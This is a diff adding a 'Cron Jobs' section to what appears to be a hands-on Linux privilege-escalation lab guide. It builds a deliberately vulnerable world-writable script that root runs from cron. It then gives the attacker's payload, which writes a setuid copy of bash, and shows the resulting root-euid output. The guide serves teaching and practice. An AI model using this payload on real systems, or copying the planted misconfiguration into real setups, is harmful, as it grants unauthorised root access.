@@ -227,4 +227,66 @@ uid=1004(hacker_wildcard_injection) gid=1004(hacker_wildcard_injection) euid=0(r
 ```
 
 
+## 🟢 Cron Jobs
+
+#### On the Victim machine - DO THIS
+```
+sudo useradd -m hacker_cron
+sudo passwd hacker_cron
+```
+
+```
+sudo mkdir /opt/cron_lab
+sudo nano /opt/cron_lab/backup.sh
+```
+Add:
+```bash
+#!/bin/bash
+
+echo "backup running..." > /tmp/backup.log
+```
+```
+sudo chmod +x /opt/cron_lab/backup.sh
+sudo chmod 777 /opt/cron_lab/backup.sh
+```
+```
+sudo nano /etc/crontab
+```
+Add:
+```
+* * * * * root /opt/cron_lab/backup.sh
+```
+
+
+#### On the Attacker machine - DO THIS
+
+```
+ssh hacker_cron@ip
+```
+```
+cat /etc/crontab
+```
+Payload:
+```bash
+echo 'cp /bin/bash /home/hacker_cron/rootbash && chmod +s /home/hacker_cron/rootbash' > /opt/cron_lab/backup.sh
+```
+
+Wait and check:
+```
+ls -l /home/hacker_cron/rootbash
+```
+```
+/home/hacker_cron/rootbash -p
+```
+```
+uid=1005(hacker_cron) gid=1005(hacker_cron) euid=0(root) egid=0(root) groups=0(root),1005(hacker_cron)
+```
+
+## 🟢 Linux Capabilities
+
+
+
+
+
+
 
